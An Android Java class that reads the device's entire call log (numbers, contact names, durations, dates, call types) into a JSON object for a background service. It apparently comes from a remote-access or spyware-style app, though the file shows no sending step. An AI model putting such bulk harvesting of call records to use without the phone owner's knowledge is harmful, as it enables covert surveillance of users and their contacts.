package com.behavioralanalysis.service;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Calls {
    public static JSONObject get() {
        JSONObject result = new JSONObject();

        JSONArray calls = new JSONArray();
        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor cursor = MainService.getContext().getContentResolver().query(allCalls, null, null, null, null);

        try {
            while (cursor.moveToNext()) {
                JSONObject call = new JSONObject();
                call.put("Number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                call.put("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                call.put("duration", cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                call.put("date", cursor.getString((cursor.getColumnIndex(CallLog.Calls.DATE))));
                call.put("type", Integer.parseInt(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))));
                calls.put(call);
            }
            result.put("calls", calls);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return result;
    }
}
